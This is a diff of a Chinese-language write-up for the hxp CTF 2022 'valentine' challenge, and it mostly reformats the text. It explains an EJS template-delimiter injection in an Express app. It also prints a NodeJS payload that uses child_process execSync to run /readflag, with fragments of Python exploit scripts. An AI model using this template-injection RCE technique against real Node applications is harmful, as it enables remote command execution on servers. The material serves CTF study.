@@ -1,11 +1,13 @@
-#RCE 
+#RCE
 
 原文：[hxp | hxp CTF 2022: valentine](https://hxp.io/blog/101/hxp-CTF-2022-valentine/)
 
 默认的 NodeJS RCE，它读取/flag：
 
 ```html
-<.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .>
+<.-
+global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString()
+.>
 ```
 
 在 Dockerfile 中，节点环境设置为生产环境。
@@ -17,8 +19,8 @@ ENV NODE_ENV=production
 这会导致快速缓存视图。
 
 ```javascript
-if (env === 'production') {
-  this.enable('view cache');
+if (env === "production") {
+  this.enable("view cache");
 }
 ```
 
@@ -30,7 +32,6 @@ if (env === 'production') {
 - Firefox: set `network.http.redirection-limit` to `1` in `about:config`
 
 如果随后使用`delimiter=.`访问站点，则将在模板中使用新的`delimiter`。
-
 
 ## pwn.py
 
@@ -57,7 +58,9 @@ m = re.search(r"hxp\{[^}]+\}", r.text)
 print(m.group(0))
 
 ```
+
 另一种
+
 ```python
 import requests
 
@@ -75,10 +78,10 @@ print(r.text)
 
 ```
 
-
 个人理解
 
 app.py
+
 ```python
 var express = require('express');
 var bodyParser = require('body-parser')
@@ -146,14 +149,17 @@ app.get('/', function (req, res) {
 app.listen(process.env.PORT || 3000);
 ```
 
-首先， /template 传递的tml会根据 `<%` 匹配 <%= name %>，上面的两个脚本是不同的方式
+首先， /template 传递的 tml 会根据 `<%` 匹配 <%= name %>，上面的两个脚本是不同的方式
 
-一个是在开始就修改delimiter,另一个是重定向时修改delimiter。
+一个是在开始就修改 delimiter,另一个是重定向时修改 delimiter。
 
 至于这个命令
 
 ```javascript
-global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString()
+global.process.mainModule.constructor
+  ._load(`child_process`)
+  .execSync(`/readflag`)
+  .toString();
 ```
 
-是用到了原型链以及nodejs child_process 模块相关的内容
+是用到了原型链以及 nodejs child_process 模块相关的内容
